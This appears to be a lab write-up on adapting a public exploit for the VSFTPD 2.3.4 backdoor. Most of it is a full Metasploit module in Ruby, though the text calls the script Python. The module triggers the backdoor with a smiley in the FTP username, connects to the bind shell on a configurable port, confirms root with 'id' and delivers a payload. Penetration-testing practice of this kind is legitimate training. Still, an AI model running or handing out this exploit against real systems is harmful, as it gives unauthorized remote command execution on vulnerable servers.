Exploit PoC Customization – VSFTPD 2.3.4:

# PoC Customization Summary

A public Python proof-of-concept exploit from Exploit-DB was reviewed and modified for a controlled lab environment. The original script contained hardcoded target values and assumptions. These were updated to accept configurable inputs and improve compatibility. This customization demonstrates how public exploits often require adaptation before effective use.

Exploit Overview:
This exploit targets a malicious backdoor present in VSFTPD version 2.3.4.  
When triggered, the backdoor spawns a bind shell on a specific port, allowing remote command execution.

Customization Performed:
The original exploit relied on a hardcoded backdoor port and minimal execution feedback.  To adapt the exploit for the lab environment, the backdoor port was made configurable using a custom option. Additional status messages were added to improve execution visibility. Public exploits often assume default configurations.  
In real-world scenarios, services may run on non-standard ports or be partially restricted. Customizing exploits improves reliability and demonstrates attacker adaptability.

Outcome:
The customized exploit demonstrates how small changes can significantly improve exploit usability in different environments.

I have taken a python based script from Exploit-DBfor Vsftpd 2.3.4 & I tried to modified it as below:
##
# Customized version of VSFTPD v2.3.4 Backdoor Exploit
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VSFTPD v2.3.4 Backdoor Command Execution (Customized)',
      'Description'    => %q{
        This module exploits a malicious backdoor present in VSFTPD v2.3.4.
        This customized version allows configuration of the backdoor bind
        shell port to better support different lab environments.
      },
      'Author'         => [ 'hdm', 'mc', 'Custom Adaptation: VAPT Analyst' ],
      'License'        => MSF_LICENSE,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'        => 2000,
          'DisableNops'  => true,
          'Compat'       =>
            {
              'PayloadType'    => 'cmd_interact',
              'ConnectionType' => 'find'
            }
        },
      'Targets'        =>
        [
          [ 'Automatic', {} ],
        ],
      'DisclosureDate' => 'Jul 3 2011',
      'DefaultTarget'  => 0))

    # Default FTP port and configurable backdoor port
    register_options(
      [
        Opt::RPORT(21),
        OptInt.new('BACKDOOR_PORT', [ true, 'Backdoor bind shell port', 6200 ])
      ], self.class)
  end

  def exploit
    print_status("Attempting exploitation against #{rhost}:#{rport}")

    # Check if backdoor shell already exists
    nsock = self.connect(false, { 'RPORT' => datastore['BACKDOOR_PORT'] }) rescue nil
    if nsock
      print_status("Backdoor port already open, connecting directly...")
      handle_backdoor(nsock)
      return
    end

    # Connect to FTP service
    connect
    banner = sock.get_once(-1, 30).to_s
    print_status("FTP Banner: #{banner.strip}")

    # Trigger backdoor using smiley in username
    sock.put("USER #{rand_text_alphanumeric(rand(6) + 1)}:)\r\n")
    resp = sock.get_once(-1, 30).to_s
    print_status("USER response: #{resp.strip}")

    if resp =~ /^530 /
      print_error("Server allows anonymous-only access; exploit cannot proceed")
      disconnect
      return
    end

    sock.put("PASS #{rand_text_alphanumeric(rand(6) + 1)}\r\n")

    # Attempt connection to backdoor shell
    nsock = self.connect(false, { 'RPORT' => datastore['BACKDOOR_PORT'] }) rescue nil
    if nsock
      print_good("Backdoor shell spawned successfully")
      handle_backdoor(nsock)
      return
    end

    disconnect
  end

  def handle_backdoor(s)
    s.put("id\n")
    response = s.get_once(-1, 5).to_s

    if response !~ /uid=/
      print_error("Connected service does not appear to be a valid shell")
      disconnect(s)
      return
    end

    print_good("Shell access confirmed: #{response.strip}")

    s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
    handler(s)
  end
End


Changes made from the original code are:
Configurable Backdoor Port:
OptInt.new('BACKDOOR_PORT', [ true, 'Backdoor bind shell port', 6200 ])

Improved Logging & Execution Visibility:
print_status("Attempting exploitation against #{rhost}:#{rport}")
1.Helps understand exploit flow 
2.Improves debugging and clarity 
3.Reflects professional exploitation practices
